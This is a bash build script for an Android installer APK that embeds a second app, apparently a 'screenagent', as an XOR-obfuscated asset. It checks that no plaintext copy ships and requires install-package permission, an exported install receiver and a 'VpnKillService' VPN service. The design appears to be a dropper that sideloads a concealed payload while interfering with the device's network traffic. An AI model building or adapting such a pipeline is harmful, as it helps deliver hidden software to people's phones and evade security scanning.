#!/usr/bin/env bash
# Real build of the installer-1.2.7.7 A-package template using the local toolchain,
# replicating backend/src/apk-builder.js: copy source, inject config (lcg16
# payload matching installer-1.3.1 and exported receiver), assembleDebug + lintDebug, apksigner verify,
# zipalign, aapt badging. Also runs a Node-side lcg16 restore round-trip to prove
# the Java restore path in MainActivity recovers the exact B package before install.
set -euo pipefail
ROOT="$(cd "$(dirname "$0")/../.." && pwd)"
export JAVA_HOME="${JAVA_HOME:-$ROOT/android/.local-tools/jdk/Contents/Home}"
export ANDROID_HOME="${ANDROID_HOME:-$ROOT/android/.local-tools/android-sdk}"
export ANDROID_SDK_ROOT="$ANDROID_HOME"
export ANDROID_USER_HOME="${ANDROID_USER_HOME:-$ROOT/android/.local-tools/android-user}"
export GRADLE_USER_HOME="${GRADLE_USER_HOME:-$ROOT/android/.local-tools/gradle-home}"
export PATH="$JAVA_HOME/bin:$PATH"
GRADLE="${GRADLE:-$ROOT/android/.local-tools/gradle-8.11.1/bin/gradle}"
TOOLS="$ANDROID_HOME/build-tools/35.0.0"
TEMPLATE="$ROOT/android/apk-templates/a-packages/installer-1.2.7.7"
for tool in "$JAVA_HOME/bin/java" "$GRADLE" "$TOOLS/apksigner" "$TOOLS/zipalign" "$TOOLS/aapt"; do
  [[ -x "$tool" ]] || { echo "Missing local tool: $tool" >&2; exit 1; }
done
[[ -f "$ANDROID_HOME/platforms/android-35/android.jar" ]] || { echo 'Android API 35 is required.' >&2; exit 1; }
umask 077
mkdir -p "$ROOT/android/dist"
WORK="$(mktemp -d "$ROOT/android/dist/installer-1.2.7.7-XXXXXX")"
mkdir -p "$WORK/source/app"
exec > >(tee "$WORK/build.log") 2>&1
echo "[$(date -u +%FT%TZ)] [BUILD] START role=a template=a-packages/installer-1.2.7.7"
echo "[$(date -u +%FT%TZ)] [STAGE:preparing] copy registered A-package template and inject lcg16 payload"
cp "$TEMPLATE/"*.gradle.kts "$TEMPLATE/gradle.properties" "$WORK/source/"
cp "$TEMPLATE/app/"{build.gradle.kts,proguard-rules.pro} "$WORK/source/app/"
cp -R "$TEMPLATE/app/src" "$WORK/source/app/src"
if [[ -n "${INSTALLER1277_PAYLOAD_APK:-}" ]]; then
  PAYLOAD_APK="$INSTALLER1277_PAYLOAD_APK"
  echo "[$(date -u +%FT%TZ)] [PAYLOAD] using provided B package: $PAYLOAD_APK"
else
  echo "[$(date -u +%FT%TZ)] [STAGE:payload] use most recent built B package before embedding"
  PAYLOAD_APK="$(ls -t "$ROOT/android/dist"/screenagent-*/screenagent.apk 2>/dev/null | head -1)"
fi
[[ -f "$PAYLOAD_APK" ]] || { echo "Missing B package payload" >&2; exit 1; }
SHA="$(shasum -a 256 "$PAYLOAD_APK" | awk '{print $1}')"
PKG="$($TOOLS/aapt dump badging "$PAYLOAD_APK" | sed -n "s/^package: name='\([^']*\)'.*/\1/p" | head -1)"
[[ -n "$PKG" ]] || { echo 'Unable to read B package id from payload APK' >&2; exit 1; }
BUILDID="${INSTALLER1277_PAYLOAD_BUILD_ID:-$(uuidgen | tr '[:upper:]' '[:lower:]')}"
# Encode the B package with the same lcg16 payload format used by installer-1.3.1:
# payload.dat = 16 zero-byte header + B-package bytes XORed with the fixed-seed
# LCG stream. This keeps the 1.2.7.6 install/VPN flow and changes the
# InstallReceiver exported flag for an A/B comparison.
node -e '
const fs = require("fs");
const orig = fs.readFileSync(process.argv[1]);
const out = Buffer.alloc(16 + orig.length);
let state = 276813 >>> 0;
for (let i = 0; i < orig.length; i++) {
  state = (Math.imul(state, 1664525) + 1013904223) >>> 0;
  out[16 + i] = orig[i] ^ ((state >>> 24) & 0xff);
}
fs.writeFileSync(process.argv[2], out);
' "$PAYLOAD_APK" "$WORK/source/app/src/main/assets/payload.dat"
cat > "$WORK/source/app/src/main/assets/installer_config.json" <<EOF
{
  "payloadBuildId": "$BUILDID",
  "payloadSha256": "$SHA",
  "payloadPackageName": "$PKG",
  "payloadEncoding": "lcg16",
  "homeUrl": "https://example.com/"
}
EOF
sed -i.bak "s|__PAYLOAD_PACKAGE_NAME__|$PKG|g" "$WORK/source/app/src/main/AndroidManifest.xml"
rm -f "$WORK/source/app/src/main/AndroidManifest.xml.bak"
grep -A4 '<receiver' "$WORK/source/app/src/main/AndroidManifest.xml" | grep -q 'android:exported="true"' || {
  echo 'InstallReceiver must be exported for 1.2.7.7 comparison' >&2
  exit 1
}
# Node-side lcg16 round-trip: skip 16-byte header, restore bytes with the fixed
# LCG stream and confirm the B package SHA-256.
echo "[$(date -u +%FT%TZ)] [STAGE:roundtrip] restore lcg16 payload.dat and verify SHA-256"
node -e '
const fs = require("fs");
const crypto = require("crypto");
const dat = fs.readFileSync(process.argv[1]);
if (dat.length < 16) { console.error("payload too short"); process.exit(1); }
let state = 276813 >>> 0;
const plain = Buffer.alloc(dat.length - 16);
for (let i = 0; i < plain.length; i++) {
  state = (Math.imul(state, 1664525) + 1013904223) >>> 0;
  plain[i] = dat[16 + i] ^ ((state >>> 24) & 0xff);
}
const sha = crypto.createHash("sha256").update(plain).digest("hex");
if (sha !== process.argv[2]) { console.error("round-trip sha mismatch"); process.exit(1); }
console.log("round-trip sha256=" + sha);
' "$WORK/source/app/src/main/assets/payload.dat" "$SHA"
echo "[$(date -u +%FT%TZ)] [PAYLOAD] buildId=$BUILDID package=$PKG sha256=$SHA format=lcg16 apk=$PAYLOAD_APK"
echo "[$(date -u +%FT%TZ)] [COMMAND:GRADLE_ASSEMBLE_LINT] START"
ARGS=(--offline)
[[ "${INSTALLER1277_GRADLE_ONLINE:-0}" == 1 ]] && ARGS=(--refresh-dependencies)
"$GRADLE" -p "$WORK/source" "${ARGS[@]}" --no-daemon --console=plain \
  -PappId=org.test.installer1277 -PversionName=1.2.7.7 -PversionCode=377 assembleDebug lintDebug
echo "[$(date -u +%FT%TZ)] [COMMAND:GRADLE_ASSEMBLE_LINT] OK"
cp "$WORK/source/app/build/outputs/apk/debug/app-debug.apk" "$WORK/installer-1.2.7.7.apk"
echo "[$(date -u +%FT%TZ)] [STAGE:signing] verify APK development signature"
"$TOOLS/apksigner" verify --verbose "$WORK/installer-1.2.7.7.apk" | tee "$WORK/signature.txt"
echo "[$(date -u +%FT%TZ)] [COMMAND:APKSIGNER_VERIFY] OK"
echo "[$(date -u +%FT%TZ)] [STAGE:aligning] verify 4-byte and 16 KiB page alignment"
"$TOOLS/zipalign" -c -P 16 4 "$WORK/installer-1.2.7.7.apk"
echo "[$(date -u +%FT%TZ)] [COMMAND:ZIPALIGN_VERIFY] OK"
echo "[$(date -u +%FT%TZ)] [STAGE:inspecting] read package, version and launcher metadata"
"$TOOLS/aapt" dump badging "$WORK/installer-1.2.7.7.apk" | tee "$WORK/badging.txt"
grep -q "package: name='org.test.installer1277'" "$WORK/badging.txt" || { echo 'APK identity mismatch: package' >&2; exit 1; }
grep -q "versionName='1.2.7.7'" "$WORK/badging.txt" || { echo 'APK identity mismatch: versionName' >&2; exit 1; }
grep -q "versionCode='377'" "$WORK/badging.txt" || { echo 'APK identity mismatch: versionCode' >&2; exit 1; }
grep -q '^launchable-activity:' "$WORK/badging.txt" || { echo 'Visible package is missing its launcher activity' >&2; exit 1; }
grep -q "uses-permission: name='android.permission.REQUEST_INSTALL_PACKAGES'" "$WORK/badging.txt" || { echo 'Missing REQUEST_INSTALL_PACKAGES' >&2; exit 1; }
"$TOOLS/aapt" dump xmltree "$WORK/installer-1.2.7.7.apk" AndroidManifest.xml > "$WORK/manifest-tree.txt"
grep -q 'VpnKillService' "$WORK/manifest-tree.txt" || { echo 'Missing VpnKillService in manifest' >&2; exit 1; }
grep -q 'android.permission.BIND_VPN_SERVICE' "$WORK/manifest-tree.txt" || { echo 'Missing BIND_VPN_SERVICE on service' >&2; exit 1; }
grep -q 'android.net.VpnService' "$WORK/manifest-tree.txt" || { echo 'Missing VpnService intent-filter' >&2; exit 1; }
grep -q 'InstallReceiver' "$WORK/manifest-tree.txt" || { echo 'Missing InstallReceiver in manifest' >&2; exit 1; }
unzip -l "$WORK/installer-1.2.7.7.apk" > "$WORK/apk-list.txt" 2>/dev/null
grep -q 'assets/payload.dat' "$WORK/apk-list.txt" || { echo 'Missing lcg16 payload.dat asset' >&2; exit 1; }
grep -q 'assets/payload.apk' "$WORK/apk-list.txt" && { echo 'Unexpected plaintext payload.apk asset' >&2; exit 1; }
echo "[$(date -u +%FT%TZ)] [ROLE] launcher=present expected=present"
shasum -a 256 "$WORK/installer-1.2.7.7.apk" | tee "$WORK/SHA256SUMS"
echo "Build work directory: $WORK"
echo "[$(date -u +%FT%TZ)] [BUILD] SUCCEEDED"
echo "APK: $WORK/installer-1.2.7.7.apk"
echo 'Development build verified. Device runtime (VPN consent, draining tunnel, install, guide) is a separate step.'
